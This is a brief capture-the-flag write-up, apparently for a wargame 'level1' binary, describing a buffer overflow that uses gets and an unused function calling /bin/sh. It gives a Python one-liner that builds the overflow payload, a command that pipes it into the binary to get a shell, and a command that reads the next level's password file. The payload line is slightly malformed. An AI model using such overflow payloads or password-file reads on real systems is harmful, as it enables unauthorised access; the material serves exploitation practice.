When disasembling the main function we can see that the 'gets' function is used.
and after further researches we found a "run" function that is not used in the main program.\n
This function contains a system call using "/bin/sh"

let's do a simple buffer overflow exploit

python -c 'print "B"76+"\x44\x84\x04\x08"' > /tmp/payload

cat /tmp/payload - | ./level1 #the "-" is there to keep the stdin open to pass commands to the shell

type in:
cat /home/user/level2/.pass
